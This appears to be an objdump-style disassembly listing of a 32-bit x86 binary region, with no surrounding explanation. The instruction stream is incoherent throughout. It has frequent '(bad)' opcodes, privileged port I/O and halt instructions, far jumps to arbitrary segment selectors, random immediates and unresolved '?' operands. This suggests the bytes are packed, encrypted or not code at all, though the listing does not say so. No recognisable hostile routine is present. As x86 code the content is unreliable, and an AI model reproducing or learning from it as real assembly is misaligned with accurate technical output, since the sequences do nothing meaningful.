  4078a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a7:	or     DWORD PTR [ebx],eax
  4078a9:	mov    gs,WORD PTR [edx+0x118f191c]
  4078af:	sbb    al,0x8a
  4078b1:	push   es
  4078b2:	cwde   
  4078b3:	js     0x407847
  4078b5:	out    dx,eax
  4078b6:	mov    dl,0xdb
  4078b8:	ret    
  4078b9:	scas   al,BYTE PTR es:[edi]
  4078ba:	out    dx,eax
  4078bb:	add    ebp,DWORD PTR [esi-0x33]
  4078be:	(bad)  
  4078bf:	out    dx,eax
  4078c0:	lock mov ecx,0x9fb8c287
  4078c6:	repnz dec esi
  4078c8:	and    al,0x8c
  4078ca:	fsubr  QWORD PTR [ebp-0x5c8bee63]
  4078d0:	neg    DWORD PTR [ebx+0x40]
  4078d3:	dec    edi
  4078d4:	push   edx
  4078d5:	test   BYTE PTR [eax-0x666c297],ah
  4078db:	pop    ecx
  4078dc:	add    ah,al
  4078de:	aam    0x81
  4078e0:	lds    esp,FWORD PTR [ecx-0x4f16616b]
  4078e6:	cs or  eax,0xbf15d9be
  4078ec:	pop    edx
  4078ed:	or     cl,al
  4078ef:	cmc    
  4078f0:	add    eax,0x4e03e7f5
  4078f5:	call   0x9b1c1965
  4078fa:	stc    
  4078fb:	js     0x4078c9
  4078fd:	add    BYTE PTR [edi],0x1d
  407900:	dec    esp
  407901:	fsub   st(0),st
  407903:	jmp    0xf139:0xdb0688a5
  40790a:	neg    BYTE PTR [ebx]
  40790c:	arpl   WORD PTR [eax],bp
  40790e:	sub    eax,0xa838fc0a
  407913:	dec    ebx
  407914:	adc    eax,0x8e491737
  407919:	(bad)  
  40791b:	sar    BYTE PTR [ebp+0x56],cl
  40791e:	stos   DWORD PTR es:[edi],eax
  40791f:	mov    al,ds:0xc777e0a8
  407924:	popa   
  407925:	add    ebp,DWORD PTR [ecx+edi*4]
  407928:	dec    ebp
  407929:	in     eax,0xda
  40792b:	jmp    0x80a7:0x1761c7d3
  407932:	aad    0x59
  407934:	xchg   esi,eax
  407935:	jp     0x407990
  407937:	scas   al,BYTE PTR es:[edi]
  407938:	cmc    
  407939:	mov    ds:0x4c110d68,eax
  40793e:	xchg   ebx,eax
  40793f:	sub    cl,BYTE PTR [ebx-0x2f]
  407942:	call   0x1a20:0x22577fe4
  407949:	or     BYTE PTR [esi],dh
  40794b:	xchg   ebp,eax
  40794c:	adc    dl,BYTE PTR ds:0xe62963ad
  407952:	mov    ecx,0xa1700b6e
  407957:	sub    ah,BYTE PTR [eax-0x1ed50c83]
  40795d:	lock dec ecx
  40795f:	test   BYTE PTR [ecx+0x38],cl
  407962:	xchg   edx,eax
  407963:	imul   ebx,DWORD PTR cs:[eax+0x1de04822],0xeadb7bb4
  40796e:	jg     0x4078f6
  407970:	sub    DWORD PTR [esi+edi*1],esp
  407973:	aad    0x5e
  407975:	mov    ebp,0x2420f385
  40797a:	xchg   edx,eax
  40797b:	dec    edi
  40797c:	(bad)  
  40797d:	xor    ecx,DWORD PTR [eax+0x3de97abb]
  407983:	push   ebx
  407984:	dec    edi
  407985:	pop    edi
  407986:	mov    ch,0x3c
  407988:	out    dx,eax
  407989:	dec    ebx
  40798a:	cmp    al,0xf3
  40798c:	sub    eax,0xdd35fa24
  407991:	and    eax,0x93ebdce2
  407996:	je     0x4079a3
  407998:	fld1   
  40799a:	inc    ebp
  40799b:	cmp    BYTE PTR [ebx-0x33d84d78],dh
  4079a1:	test   DWORD PTR ds:0x36198fee,0xd69f4209
  4079ab:	sub    DWORD PTR [ecx],eax
  4079ad:	repz aad 0x75
  4079b0:	mov    ch,0xc3
  4079b2:	lea    esp,[edx+0xc430777]
  4079b8:	imul   eax,DWORD PTR [esi],0xe68fc524
  4079be:	lods   eax,DWORD PTR ds:[esi]
  4079bf:	pushf  
  4079c0:	adc    al,BYTE PTR [ebp-0x30]
  4079c3:	jmp    0xa5ea:0x7a882ae3
  4079ca:	push   ebx
  4079cb:	jg     0x407969
  4079cd:	jecxz  0x407a47
  4079cf:	repnz into 
  4079d1:	cmp    al,0x7
  4079d3:	mov    edx,0x94aa4b11
  4079d8:	jmp    0x407a46
  4079da:	inc    ebp
  4079db:	mov    ah,0x24
  4079dd:	add    cl,BYTE PTR [edx]
  4079df:	push   eax
  4079e0:	or     ah,BYTE PTR [esi-0x6b]
  4079e3:	in     al,0x97
  4079e5:	cmp    ah,BYTE PTR [esi-0x53dde938]
  4079eb:	bound  edx,QWORD PTR [edx]
  4079ed:	xor    BYTE PTR [esi-0x75],cl
  4079f0:	add    DWORD PTR [edx-0x49],esi
  4079f3:	popa   
  4079f4:	pop    ebx
  4079f5:	repnz add cl,BYTE PTR [ebx-0x43]
  4079f9:	jns    0x407a17
  4079fb:	jp     0x407995
  4079fd:	xor    ebp,DWORD PTR [ecx+0xf60e88d]
  407a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a04:	push   ss
  407a05:	js     0x4079fa
  407a07:	int    0xa
  407a09:	cmp    ah,BYTE PTR [edi-0x47]
  407a0c:	out    dx,al
  407a0d:	xchg   ebp,eax
  407a0e:	popf   
  407a0f:	neg    BYTE PTR [eax+0x23]
  407a12:	mov    ah,0x6f
  407a14:	xor    esi,esp
  407a16:	arpl   cx,sp
  407a18:	lahf   
  407a19:	xor    BYTE PTR [eax+0x52c3ec3c],0xae
  407a20:	mov    ds:0xd6ab3401,eax
  407a25:	enter  0xb4fd,0x1f
  407a29:	push   edi
  407a2a:	mov    ecx,0x356750c2
  407a2f:	out    dx,al
  407a30:	cmp    BYTE PTR [edx+0x58],ch
  407a33:	and    bl,bh
  407a35:	pop    edx
  407a36:	xor    edx,ebx
  407a38:	pop    edi
  407a39:	ret    0xafa0
  407a3c:	xchg   ebx,eax
  407a3d:	xchg   esp,eax
  407a3e:	popa   
  407a3f:	out    0x5f,al
  407a41:	or     eax,0xc2af6d8b
  407a46:	out    dx,eax
  407a47:	push   edx
  407a48:	xchg   BYTE PTR [esi],dl
  407a4a:	mov    al,ds:0x10843783
  407a4f:	ffree  st(5)
  407a51:	(bad)  
  407a53:	push   cs
  407a54:	jge    0x407ac8
  407a56:	fpatan 
  407a58:	mov    al,0x4c
  407a5a:	push   esp
  407a5b:	shr    DWORD PTR [ebx],1
  407a5d:	mov    ebp,0x99e3fd11
  407a62:	mov    dh,BYTE PTR [edi]
  407a64:	inc    BYTE PTR [eax-0x2c30ba9e]
  407a6a:	hlt    
  407a6b:	scas   al,BYTE PTR es:[edi]
  407a6c:	pop    esi
  407a6d:	les    ebp,FWORD PTR [eax-0xa]
  407a70:	das    
  407a71:	sub    DWORD PTR [ebp+0x6880d969],0xd1ed9dc8
  407a7b:	lea    ebx,[ebx-0x4ad6710a]
  407a81:	xchg   ecx,eax
  407a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a83:	call   0xadd268d
  407a88:	ffreep st(1)
  407a8a:	call   0xed25c6d8
  407a8f:	stc    
  407a90:	mov    esp,0x1b2fe570
  407a95:	lds    esi,FWORD PTR [ebx+0x47]
  407a98:	mov    ds:0x6f5e144c,eax
  407a9d:	jecxz  0x407a5d
  407a9f:	pop    ss
  407aa0:	jmp    0x87fde7bd
  407aa5:	inc    BYTE PTR [ecx-0x49]
  407aa8:	push   ebx
  407aa9:	sub    BYTE PTR [edx],bl
  407aab:	(bad)  
  407aac:	ja     0x407a8b
  407aae:	(bad)  
  407aaf:	loope  0x407ab0
  407ab1:	or     eax,0xc6945663
  407ab6:	fstp   DWORD PTR [ecx+0x70]
  407ab9:	jb     0x407a3e
  407abb:	add    dh,dl
  407abd:	outs   dx,BYTE PTR ds:[esi]
  407abe:	(bad)  
  407abf:	xor    ecx,0x87ffab5a
  407ac5:	fwait
  407ac6:	in     eax,dx
  407ac7:	sub    eax,0xe769038d
  407acc:	push   esp
  407acd:	push   cs
  407ace:	retf   0x3a01
  407ad1:	fwait
  407ad2:	xchg   ecx,eax
  407ad3:	add    eax,0x294400cb
  407ad8:	or     ah,BYTE PTR [eax]
  407ada:	adc    ebx,DWORD PTR [ebx]
  407adc:	cmc    
  407add:	mov    ebp,0x377b72f1
  407ae2:	dec    edi
  407ae3:	outs   dx,BYTE PTR ds:[esi]
  407ae4:	test   eax,0x3bf6f4d6
  407ae9:	jo     0x407af4
  407aeb:	add    cl,BYTE PTR [edx]
  407aed:	ret    
  407aee:	add    eax,0xe12b2a89
  407af3:	ficom  WORD PTR [esi+eiz*2-0x7b3f95bf]
  407afa:	stc    
  407afb:	retf   
  407afc:	lods   al,BYTE PTR ds:[esi]
  407afd:	popaw  
  407aff:	loope  0x407b5f
  407b01:	out    0xaa,al
  407b03:	js     0x407aa1
  407b05:	add    bl,al
  407b07:	into   
  407b08:	push   bp
  407b0a:	cmp    edx,edx
  407b0c:	cli    
  407b0d:	call   0x3b9b9099
  407b12:	daa    
  407b13:	push   ecx
  407b14:	xor    dh,BYTE PTR [eax+0xcde7503]
  407b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b1b:	mov    BYTE PTR [edx],cl
  407b1d:	sbb    BYTE PTR [edx+0x3c],0xa3
  407b21:	mov    eax,0x458ba4a3
  407b26:	ret    0x578a
  407b29:	in     eax,dx
  407b2a:	sbb    edi,DWORD PTR [eax]
  407b2c:	adc    esp,edi
  407b2e:	aas    
  407b2f:	xchg   dh,dh
  407b31:	sub    ch,ch
  407b33:	test   BYTE PTR es:[ebp-0x4a6a7a45],al
  407b3a:	inc    ecx
  407b3b:	xor    BYTE PTR [esi-0x7],ch
  407b3e:	inc    esi
  407b3f:	adc    ebp,DWORD PTR cs:[edx-0x49004d57]
  407b46:	scas   al,BYTE PTR es:[edi]
  407b47:	(bad)  
  407b49:	xor    eax,0xe9fd2b60
  407b4e:	js     0x407b40
  407b50:	mov    dh,0xe4
  407b52:	jmp    0x1ee7a2ae
  407b57:	retf   0xfb5e
  407b5a:	(bad)  
  407b5b:	frstor [ebx]
  407b5d:	ret    
  407b5e:	jp     0x407b3d
  407b60:	stos   DWORD PTR es:[edi],eax
  407b61:	test   al,0xac
  407b63:	sbb    al,0x98
  407b65:	out    dx,al
  407b66:	loopne 0x407b39
  407b68:	outs   dx,DWORD PTR gs:[esi]
  407b6a:	push   ss
  407b6b:	inc    ebx
  407b6c:	aas    
  407b6d:	or     bh,0x5b
  407b70:	xchg   esi,eax
  407b71:	lods   eax,DWORD PTR ds:[esi]
  407b72:	mov    al,0x1
  407b74:	sahf   
  407b75:	mov    eax,0x60d4776d
  407b7a:	lods   eax,DWORD PTR ds:[esi]
  407b7b:	mov    ah,0xb3
  407b7d:	jb     0x407b76
  407b7f:	les    ebx,FWORD PTR [esi+0x69]
  407b82:	jmp    0x58ccedd0
  407b87:	xchg   ecx,eax
  407b88:	cli    
  407b89:	neg    BYTE PTR [ebp+0x54af8e0f]
  407b8f:	not    esi
  407b91:	pop    ecx
  407b92:	fcomp  QWORD PTR [eax]
  407b94:	xor    eax,0x8b386c11
  407b99:	fmul   st,st(4)
  407b9b:	int    0x51
  407b9d:	out    dx,al
  407b9e:	fidivr DWORD PTR [edx+0x18]
  407ba1:	sub    DWORD PTR [edx-0x6e],0x74a6ec06
  407ba8:	std    
  407ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407baa:	pop    edx
  407bab:	retf   
  407bac:	mov    eax,ds:0x77900492
  407bb1:	mov    eax,ds:0xe3794aa
  407bb6:	pusha  
  407bb7:	inc    eax
  407bb8:	bound  ebx,QWORD PTR [esi-0x5e55d72f]
  407bbe:	sahf   
  407bbf:	pop    ecx
  407bc0:	dec    esi
  407bc1:	mov    ecx,DWORD PTR [esi+0x6c]
  407bc4:	inc    edi
  407bc5:	into   
  407bc6:	sbb    al,0x59
  407bc8:	and    DWORD PTR [esi-0x390058cd],edi
  407bce:	ins    BYTE PTR es:[di],dx
  407bd0:	inc    edi
  407bd1:	and    BYTE PTR [ebp-0x6b],cl
  407bd4:	xchg   ebp,eax
  407bd5:	sbb    edx,DWORD PTR [ebp-0x16568aad]
  407bdb:	mov    ?,WORD PTR [esi]
  407bdd:	jns    0x407c00
  407bdf:	sbb    ebx,DWORD PTR [ebx]
  407be1:	leave  
  407be2:	loope  0x407c39
  407be4:	sbb    cl,BYTE PTR [esi-0x3b]
  407be7:	jmp    0x407c31
  407be9:	dec    edi
  407bea:	pop    esi
  407beb:	mov    ecx,0xa578906b
  407bf0:	(bad)  
  407bf1:	pop    ss
  407bf2:	cmp    ebx,ecx
  407bf4:	pop    ecx
  407bf5:	sar    dh,cl
  407bf7:	not    DWORD PTR [edi+0x5]
  407bfa:	pop    ebx
  407bfb:	jecxz  0x407bc6
  407bfd:	and    BYTE PTR [eax-0x78],al
  407c00:	das    
  407c01:	jne    0x407bfe
  407c03:	clc    
  407c04:	jmp    0xe8a3bc9b
  407c09:	es lahf 
  407c0b:	jge    0x407c32
  407c0d:	sbb    esi,DWORD PTR [ebx]
  407c0f:	ins    BYTE PTR es:[edi],dx
  407c10:	into   
  407c11:	data16 adc BYTE PTR [ecx+0x50],al
  407c15:	jmp    0x396f0225
  407c1a:	lea    eax,[esi]
  407c1c:	mov    ds:0x726130c8,al
  407c21:	add    eax,0xcaec3beb
  407c26:	int3   
  407c27:	or     esp,edi
  407c29:	push   edx
  407c2a:	inc    ebx
  407c2b:	stos   BYTE PTR es:[edi],al
  407c2c:	repz cwde 
  407c2e:	daa    
  407c2f:	sub    bl,BYTE PTR [edi]
  407c31:	sub    BYTE PTR [ebp-0x395487c6],cl
  407c37:	out    dx,eax
  407c38:	and    eax,0x5247f718
  407c3d:	mov    ?,WORD PTR [edx+0x28ec13c4]
  407c43:	cwde   
  407c44:	pop    esi
  407c45:	or     BYTE PTR [eiz*1-0x1e0b8fb1],cl
  407c4c:	lods   eax,DWORD PTR ds:[esi]
  407c4d:	push   ecx
  407c4e:	lea    ebx,[edx+ecx*4+0x40b78f49]
  407c55:	scas   al,BYTE PTR es:[edi]
  407c56:	aad    0x73
  407c58:	cmc    
  407c59:	in     al,0xfa
  407c5b:	xor    bh,dl
  407c5d:	mov    edx,0x3726d0be
  407c62:	sub    eax,DWORD PTR [edi+ebp*8]
  407c65:	fisubr DWORD PTR [ebx+ebp*8]
  407c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c69:	retf   0x9615
  407c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c6d:	fcomp  QWORD PTR [ebp-0x5f]
  407c70:	mov    WORD PTR [ebp+eiz*4+0x7e4f1b22],cs
  407c77:	out    0x18,al
  407c79:	cmp    DWORD PTR [ecx+eax*2-0x658372a9],ebx
  407c80:	cmp    ebp,DWORD PTR [ecx+edi*8]
  407c83:	sub    eax,0x55c91a59
  407c88:	cmp    dh,BYTE PTR [edi]
  407c8a:	and    al,0x74
  407c8c:	adc    dl,ch
  407c8e:	pusha  
  407c8f:	test   eax,0xc068f364
  407c94:	pop    esp
  407c95:	pop    ecx
  407c96:	cmp    eax,0x434aeb04
  407c9b:	mov    al,ds:0x2492da94
  407ca0:	in     eax,dx
  407ca1:	cmp    eax,0x42fd9e65
  407ca6:	inc    ebx
  407ca7:	mov    eax,ds:0xb1c1c2cc
  407cac:	dec    ebx
  407cad:	push   cs
  407cae:	pusha  
  407caf:	popa   
  407cb0:	lods   al,BYTE PTR ds:[esi]
  407cb1:	div    DWORD PTR [edi+eiz*4]
  407cb4:	sti    
  407cb5:	xor    DWORD PTR [ebx+0x2b187b8e],ebp
  407cbb:	call   0xbcd27abb
  407cc0:	int3   
  407cc1:	pop    edx
  407cc2:	add    ecx,DWORD PTR [edx]
  407cc4:	mov    ch,0x6e
  407cc6:	inc    edi
  407cc7:	inc    BYTE PTR [esi-0x25324450]
  407ccd:	and    eax,0x218be912
  407cd2:	aam    0x3e
  407cd4:	adc    ah,ah
  407cd6:	out    0xc6,al
  407cd8:	pop    ss
  407cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cda:	or     dh,BYTE PTR [ebx+0x6554b033]
  407ce0:	push   edi
  407ce1:	adc    BYTE PTR [esi+ebx*1+0x55ac75b5],al
  407ce8:	enter  0xc7c4,0x5a
  407cec:	lea    esi,[esi]
  407cee:	and    BYTE PTR ds:0x4135fe7f,cl
  407cf4:	call   0xcd0e12a
  407cf9:	push   edi
  407cfa:	jns    0x407c9f
  407cfc:	inc    esp
  407cfd:	inc    ebp
  407cfe:	mov    al,0x30
  407d00:	xor    dh,BYTE PTR [eax+0x7e]
  407d03:	jge    0x407d71
  407d05:	pop    edx
  407d06:	es in  eax,0x31
  407d09:	cli    
  407d0a:	(bad)  [esi+0x77]
  407d0d:	lahf   
  407d0e:	ficom  DWORD PTR [esi]
  407d10:	adc    al,BYTE PTR [ecx]
  407d12:	mov    ebx,0xa3445173
  407d17:	mov    bl,0xa0
  407d19:	and    BYTE PTR [eax+0x6f135d6f],ah
  407d1f:	adc    DWORD PTR [eax+0x45],ebp
  407d22:	push   ds
  407d23:	jae    0x407cdf
  407d25:	jnp    0x407d7c
  407d27:	fistp  DWORD PTR [edi]
  407d29:	cmp    al,0x1
  407d2b:	sbb    BYTE PTR [ebx+0x20],dl
  407d2e:	push   ecx
  407d2f:	push   cs
  407d30:	xchg   esp,eax
  407d31:	mov    ds:0xdd2f6bf7,eax
  407d36:	jbe    0x407cc3
  407d38:	pop    ss
  407d39:	ja     0x407d6e
  407d3b:	xchg   esp,eax
  407d3c:	cmp    DWORD PTR [edi],ebx
  407d3e:	stos   DWORD PTR es:[edi],eax
  407d3f:	lahf   
  407d40:	cmc    
  407d41:	inc    DWORD PTR [edi-0xb1baa70]
  407d47:	or     eax,0xc547cc84
  407d4c:	je     0x407d7e
  407d4e:	test   DWORD PTR [ebp+edx*4-0x25651ae3],ebx
  407d55:	cmp    ebx,DWORD PTR [esi]
  407d57:	fadd   QWORD PTR [edi-0x4f]
  407d5a:	loope  0x407d1a
  407d5c:	fimul  WORD PTR [ebp+0x15]
  407d5f:	xlat   BYTE PTR ds:[ebx]
  407d60:	daa    
  407d61:	push   esp
  407d62:	int3   
  407d63:	sub    eax,0x16eabd8e
  407d68:	imul   edi,DWORD PTR [eax+0x16],0x4c79a406
  407d6f:	dec    ebx
  407d70:	pop    esp
  407d71:	push   esp
  407d72:	push   es
  407d73:	mov    eax,ds:0x3a52c91c
  407d78:	jl     0x407d31
  407d7a:	xor    eax,0x894ae6d1
  407d7f:	je     0x407dce
  407d81:	ja     0x407db9
  407d83:	sar    esp,cl
  407d85:	pop    ebp
  407d86:	frndint 
  407d88:	adc    al,0x70
  407d8a:	int3   
  407d8b:	fyl2xp1 
  407d8d:	mov    DWORD PTR [esi],esi
  407d8f:	repz sub bl,bh
  407d92:	mov    BYTE PTR [ebx],ch
  407d94:	mov    BYTE PTR [esi+ecx*4-0x46],0x7d
  407d99:	and    BYTE PTR [eax+0x29],dh
  407d9c:	sbb    dh,dh
  407d9e:	mov    ah,0x3e
  407da0:	data16 outs dx,BYTE PTR ds:[esi]
  407da2:	inc    edi
  407da3:	stc    
  407da4:	push   edx
  407da5:	(bad)  
  407da6:	mov    bl,0x29
  407da8:	sub    dl,bh
  407daa:	push   cs
  407dab:	sub    DWORD PTR [edi],0x608e03c6
  407db1:	data16 loopne 0x407d9a
  407db4:	leave  
  407db5:	add    al,BYTE PTR [edi-0x80]
  407db8:	lock cmp al,0xa7
  407dbb:	iret   
  407dbc:	rcr    DWORD PTR [ebx-0x3a],cl
  407dbf:	enter  0x9d52,0x7d
  407dc3:	iret   
  407dc4:	xchg   edx,eax
  407dc5:	add    esp,edi
  407dc7:	repnz add eax,0x9c0104b1
  407dcd:	(bad)  
  407dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dcf:	fdiv   QWORD PTR [edi+0x48]
  407dd2:	adc    ebp,DWORD PTR [edx-0x7d44fac7]
  407dd8:	retf   0xc571
  407ddb:	out    dx,al
  407ddc:	aas    
  407ddd:	jp     0x407d74
  407ddf:	lods   eax,DWORD PTR ds:[esi]
  407de0:	stos   BYTE PTR es:[edi],al
  407de1:	inc    ebp
  407de2:	stos   BYTE PTR es:[edi],al
  407de3:	adc    DWORD PTR [ebx-0x3e],esi
  407de6:	stc    
  407de7:	jg     0x407e44
  407de9:	mov    dl,0x98
  407deb:	sar    BYTE PTR [edi-0x4c7cd1a],1
  407df1:	or     ch,BYTE PTR [edx+eax*8]
  407df4:	into   
  407df5:	add    ebp,ebx
  407df7:	push   eax
  407df8:	dec    eax
  407df9:	lea    edi,[edi+0x53577073]
  407dff:	es mov ebp,0xe7d779cb
  407e05:	and    ecx,DWORD PTR [ebp+edi*8+0x677af8b]
  407e0c:	jo     0x407dce
  407e0e:	test   eax,0x37a78c36
  407e13:	push   0xd41839d
  407e18:	sub    al,0x39
  407e1a:	push   edx
  407e1b:	sbb    eax,0x8e9f65a9
  407e20:	mov    dl,0xb6
  407e22:	xchg   esp,eax
  407e23:	sbb    edx,eax
  407e25:	ss leave 
  407e27:	inc    ecx
  407e28:	in     al,0x81
  407e2a:	es xchg esp,eax
  407e2c:	mov    dl,0xa5
  407e2e:	jbe    0x407ea3
  407e30:	sbb    edi,DWORD PTR ds:0x399f90a3
  407e36:	popa   
  407e37:	pop    ebx
  407e38:	lock mov fs,WORD PTR [eax]
  407e3b:	xchg   BYTE PTR [ecx],ch
  407e3d:	push   esi
  407e3e:	or     al,0x8f
  407e40:	push   ecx
  407e41:	dec    edx
  407e42:	retf   0x8fb8
  407e45:	xor    esp,edi
  407e47:	sahf   
  407e48:	imul   esi,ebx,0x52
  407e4b:	pop    edx
  407e4c:	xor    eax,0x2dbdd37a
  407e51:	retf   0x3d0f
  407e54:	ret    
  407e55:	dec    ebp
  407e56:	sbb    ah,ch
  407e58:	lahf   
  407e59:	xor    al,0x76
  407e5b:	xor    BYTE PTR [esi+0x1f],dh
  407e5e:	fstp   DWORD PTR [ecx-0xa691550]
  407e64:	pop    es
  407e65:	aaa    
  407e66:	and    DWORD PTR [esi+0x4c],eax
  407e69:	fisub  WORD PTR cs:[ebx-0x55ab5a1f]
  407e70:	mov    cl,0x87
  407e72:	xor    esi,ecx
  407e74:	xchg   ebx,eax
  407e75:	inc    edi
  407e76:	xor    DWORD PTR [ebx],0xffffffce
  407e79:	or     al,0x29
  407e7b:	or     eax,0x3aad8fba
  407e80:	inc    edx
  407e81:	fs dec edx
  407e83:	jne    0x407e62
  407e85:	scas   al,BYTE PTR es:[edi]
  407e86:	ja     0x407f06
  407e88:	xchg   ecx,eax
  407e89:	sub    al,0x8a
  407e8b:	mov    eax,ds:0xb578b4b4
  407e90:	push   edx
  407e91:	jecxz  0x407ea8
  407e93:	aas    
  407e94:	jnp    0x407e88
  407e96:	aad    0xa2
  407e98:	fldcw  WORD PTR [ecx]
  407e9a:	lahf   
  407e9b:	mov    ch,0xe7
  407e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e9e:	mov    WORD PTR [esi-0x597dde90],?
  407ea4:	push   esi
  407ea5:	mov    dl,0x3d
  407ea7:	fidivr WORD PTR [edx+0x1113e853]
  407ead:	pop    ebx
  407eae:	xchg   ecx,eax
  407eaf:	scas   al,BYTE PTR es:[edi]
  407eb0:	mov    ds:0x58a05938,al
  407eb5:	aas    
  407eb6:	cmp    ebx,ebx
  407eb8:	arpl   WORD PTR [ecx],si
  407eba:	pop    esp
  407ebb:	leave  
  407ebc:	jb     0x407f06
  407ebe:	div    BYTE PTR [eax+0x663d4fe]
  407ec4:	xor    eax,0x33031868
  407ec9:	fs ret 0x91a0
  407ecd:	pop    ebx
  407ece:	jns    0x407edc
  407ed0:	jle    0x407f37
  407ed2:	lods   al,BYTE PTR ds:[esi]
  407ed3:	jns    0x407f21
  407ed5:	lahf   
  407ed6:	loope  0x407e94
  407ed8:	leave  
  407ed9:	push   ebp
  407eda:	add    esp,DWORD PTR [ebx-0x68]
  407edd:	bound  esp,QWORD PTR [ebp-0x54c5101c]
  407ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee4:	imul   ebx,DWORD PTR [eax],0xffffff95
  407ee7:	xchg   esi,eax
  407ee8:	push   eax
  407ee9:	sbb    bh,BYTE PTR [esi-0x4b]
  407eec:	stc    
  407eed:	hlt    
  407eee:	and    esi,DWORD PTR [edi+edx*2-0x33]
  407ef2:	ds mov dl,0xec
  407ef5:	adc    eax,0x25aa074a
  407efa:	dec    edi
  407efb:	add    BYTE PTR [esi],0x3c
  407efe:	sub    al,BYTE PTR [ecx+0x3ace3100]
  407f04:	dec    esp
  407f05:	cdq    
  407f06:	mov    al,0x28
  407f08:	jecxz  0x407ebc
  407f0a:	jbe    0x407f4d
  407f0c:	out    0x47,al
  407f0e:	enter  0x9b8e,0xb7
  407f12:	call   0xcf16:0xa16dba83
  407f19:	xchg   DWORD PTR [ebp+0x78],edi
  407f1c:	push   ecx
  407f1d:	sub    BYTE PTR [edi-0x6a7a53fc],0xe
  407f24:	add    edi,ebp
  407f26:	or     ebp,DWORD PTR [ebx+eiz*8+0x32ce07ad]
  407f2d:	pop    ds
  407f2e:	adc    eax,0x8295995f
  407f33:	push   esp
  407f34:	mov    eax,ebp
  407f36:	adc    bl,dh
  407f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f39:	dec    esp
  407f3a:	sub    BYTE PTR [ecx+0x47],ch
  407f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f3e:	lods   al,BYTE PTR ds:[esi]
  407f3f:	fistp  QWORD PTR ds:0xa7862fdb
  407f45:	jecxz  0x407f80
  407f47:	mov    BYTE PTR [ecx],ah
  407f49:	loope  0x407fc5
  407f4b:	push   0x19572c9e
  407f50:	sbb    esi,DWORD PTR [ecx+0x75398d0b]
  407f56:	jb     0x407fc7
  407f58:	or     dl,0x33
  407f5b:	fwait
  407f5c:	ds test edx,edi
  407f5f:	add    DWORD PTR [ecx+0x2b87143e],edx
  407f65:	not    BYTE PTR [esi+0x35]
  407f68:	jno    0x407f63
  407f6a:	push   ebx
  407f6b:	and    DWORD PTR [edx-0x2f],edx
  407f6e:	mov    ecx,0xc6aad92e
  407f73:	jmp    0xf9d69fef
  407f78:	neg    DWORD PTR [edi+0x572a62f8]
  407f7e:	jno    0x407fec
  407f80:	das    
  407f81:	add    eax,0xddc9322b
  407f86:	fldcw  WORD PTR [ecx]
  407f88:	jns    0x407f6f
  407f8a:	pushf  
  407f8b:	cmp    esi,ebx
  407f8d:	cld    
  407f8e:	and    ebp,DWORD PTR [ecx]
  407f90:	xchg   ebx,eax
  407f92:	call   0x1e31:0x78d8e2b2
  407f99:	cmc    
  407f9a:	pop    ecx
  407f9b:	cmp    eax,0x2f0e41c
  407fa0:	jmp    0x407fb4
  407fa2:	mov    al,ds:0xd687c23
  407fa7:	call   0x3b0:0x102a1b39
  407fae:	xor    al,0x75
  407fb0:	pop    ebx
  407fb1:	cld    
  407fb2:	aaa    
  407fb3:	cmp    BYTE PTR [ebx-0x80],dl
  407fb6:	ins    DWORD PTR es:[edi],dx
  407fb7:	xchg   edx,eax
  407fb8:	jmp    0xe2b:0x90ef1bed
  407fbf:	je     0x407ff4
  407fc1:	(bad)  
  407fc2:	in     eax,dx
  407fc3:	pop    edi
  407fc4:	jmp    0xd6850506
  407fc9:	jle    0x408021
  407fcb:	mov    ebx,0x49458319
  407fd0:	stos   DWORD PTR es:[edi],eax
  407fd1:	dec    edi
  407fd2:	inc    eax
  407fd3:	and    bh,BYTE PTR [esi-0x1]
  407fd6:	mov    edi,0xbc96abe0
  407fdb:	neg    BYTE PTR [ebx+0x4623a99c]
  407fe1:	dec    ecx
  407fe2:	fimul  DWORD PTR [ecx]
  407fe4:	imul   edx,ecx,0x5f
  407fe7:	in     al,0x20
  407fe9:	cmp    BYTE PTR [eax+0x4c],0xee
  407fed:	mov    ah,0x96
  407fef:	ficomp WORD PTR [esi]
  407ff1:	jecxz  0x407f7b
  407ff3:	test   BYTE PTR [edi-0x11336640],bh
  407ff9:	out    0x2a,eax
  407ffb:	push   0x3e
  407ffd:	out    0x74,eax
  407fff:	and    esi,ebx
  408001:	rol    BYTE PTR [edi-0x5794993b],cl
  408007:	inc    eax
  408008:	or     eax,0xb91870b2
  40800d:	popf   
  40800e:	call   0x86e7d9dd
  408013:	(bad)  
  408014:	xchg   ebp,eax
  408015:	or     al,0xcf
  408017:	mov    bl,0x24
  408019:	xchg   DWORD PTR [esi+0x3449f23b],ecx
  40801f:	push   es
  408020:	sti    
  408021:	mov    WORD PTR [ebx],ds
  408023:	lock xor al,0x16
  408026:	mov    DWORD PTR [ebx-0x53],edx
  408029:	add    eax,eax
  40802b:	mov    dh,0xf3
  40802d:	jbe    0x407fe0
  40802f:	ss jae 0x40809e
  408032:	aam    0xa
  408034:	fstp   TBYTE PTR [eax+0x7d92b24b]
  40803a:	lahf   
  40803b:	pop    ecx
  40803c:	in     al,0x13
  40803e:	mov    esp,DWORD PTR [ecx]
  408040:	clc    
  408041:	push   edi
  408042:	pop    ebx
  408043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408044:	mov    WORD PTR [ebx-0x7a91dfe8],es
  40804a:	mov    ebx,0xf9ca7ee1
  40804f:	pop    edi
  408050:	pusha  
  408051:	jecxz  0x40803a
  408053:	push   ss
  408054:	(bad)  
  408055:	or     eax,0xe7cea37c
  40805a:	leave  
  40805b:	push   edi
  40805c:	cmp    ah,BYTE PTR [ebx]
  40805e:	div    BYTE PTR [esi]
  408060:	ret    
  408061:	js     0x4080d2
  408063:	ins    BYTE PTR es:[edi],dx
  408064:	sti    
  408065:	mov    ecx,0x82b02de7
